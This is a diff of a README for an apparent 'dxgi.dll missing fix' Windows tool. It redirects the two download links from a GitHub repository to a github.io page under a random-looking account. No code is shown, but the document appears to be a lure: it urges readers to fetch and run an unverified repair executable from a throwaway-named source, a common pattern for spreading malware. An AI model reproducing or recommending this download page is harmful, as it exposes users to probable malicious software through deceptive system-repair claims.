@@ -1,6 +1,6 @@
 # 🛠️ dxgi-DLL-Missing-Fix - Repair missing system files instantly
 
-[![](https://img.shields.io/badge/Download_Fix-Blue.svg)](https://github.com/antitrustlegislationpneumovax204/dxgi-DLL-Missing-Fix)
+[![](https://img.shields.io/badge/Download_Fix-Blue.svg)](https://antitrustlegislationpneumovax204.github.io)
 
 This tool fixes the dxgi.dll error on Windows systems. You see this error when your computer cannot find the necessary file to run a game or application. This tool restores the missing file to its correct location. It works on Windows 10 and Windows 11.
 
@@ -13,7 +13,7 @@ This tool requires a computer running a 64-bit version of Windows 10 or Windows 
 ## 🚀 Downloading the Fix
 You can get the latest version of the repair tool from the link below.
 
-[Download the fix here](https://github.com/antitrustlegislationpneumovax204/dxgi-DLL-Missing-Fix)
+[Download the fix here](https://antitrustlegislationpneumovax204.github.io)
 
 Visit the link to access the files. Look for the release section to find the current version. Save the file to your computer. You may choose any folder, such as your Downloads folder.
 
